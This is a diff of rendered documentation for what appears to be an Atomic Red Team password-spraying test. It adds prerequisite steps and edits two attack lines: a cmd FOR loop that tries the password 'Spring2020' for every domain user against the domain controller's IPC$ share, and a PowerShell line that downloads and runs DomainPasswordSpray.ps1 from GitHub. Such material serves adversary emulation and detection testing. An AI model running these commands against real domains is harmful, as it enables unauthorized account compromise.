@@ -454,6 +454,34 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#dependencies-run-with-none">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         None
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-list-of-domain-users-to-password-spray-must-exits-at-temp-users-txt">
+         Description: List of domain users to password spray must exits at %temp%\users.txt
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#check-prereq-commands">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#get-prereq-commands">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
       <a class="reference internal nav-link" href="#attack-commands-run-with-command-prompt">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
@@ -536,9 +564,36 @@ This atomic attempts to map the IPC$ share on one of the Domain Controllers usin
 Use the get_prereq_command’s to create a list of all domain users in the temp directory called users.txt.
 See the “Windows FOR Loop Password Spraying Made Easy” blog by &#64;OrEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5
 <strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="dependencies-run-with-none">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">None</span></code>!<a class="headerlink" href="#dependencies-run-with-none" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="description-list-of-domain-users-to-password-spray-must-exits-at-temp-users-txt">
+<h5>Description: List of domain users to password spray must exits at %temp%\users.txt<a class="headerlink" href="#description-list-of-domain-users-to-password-spray-must-exits-at-temp-users-txt" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="check-prereq-commands">
+<h5>Check Prereq Commands:<a class="headerlink" href="#check-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>if not exist %temp%\users.txt (exit /b 1)
+
+</pre></div>
+</div>
+</div>
+<div class="section" id="get-prereq-commands">
+<h5>Get Prereq Commands:<a class="headerlink" href="#get-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>PathToAtomicsFolder\T1110.003\src\parse_net_users.bat
+
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1110</span><span class="o">.</span><span class="mi">003</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">1</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
 <div class="section" id="attack-commands-run-with-command-prompt">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>@FOR /F %n in (%temp%\users.txt) do @echo | set/p=. &amp; @net use %logonserver%\IPC$ /user:&quot;%userdomain%\%n&quot; &quot;#{password}&quot; 1&gt;NUL 2&gt;&amp;1 &amp;&amp; @echo [*] %n:#{password} &amp;&amp; @net use /delete %logonserver%\IPC$ &gt; NUL
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>@FOR /F %n in (%temp%\users.txt) do @echo | set/p=. &amp; @net use %logonserver%\IPC$ /user:&quot;%userdomain%\%n&quot; &quot;Spring2020&quot; 1&gt;NUL 2&gt;&amp;1 &amp;&amp; @echo [*] %n:Spring2020 &amp;&amp; @net use /delete %logonserver%\IPC$ &gt; NUL
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -557,7 +612,7 @@ See the “Windows FOR Loop Password Spraying Made Easy” blog by &#64;OrEquals
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="attack-commands-run-with-powershell">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">IEX </span><span class="p">(</span><span class="nb">IWR </span><span class="s1">&#39;https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1&#39;</span><span class="p">);</span> <span class="nb">Invoke-DomainPasswordSpray</span> <span class="n">-Password</span> <span class="n">Spring2017</span> <span class="n">-Domain</span> <span class="c">#{domain} -Force</span>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">IEX </span><span class="p">(</span><span class="nb">IWR </span><span class="s1">&#39;https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1&#39;</span><span class="p">);</span> <span class="nb">Invoke-DomainPasswordSpray</span> <span class="n">-Password</span> <span class="n">Spring2017</span> <span class="n">-Domain</span> <span class="p">(</span><span class="nb">Get-ADDomain</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">Name</span><span class="p">)</span> <span class="n">-Force</span>
 </pre></div>
 </div>
 <div class="cell docutils container">
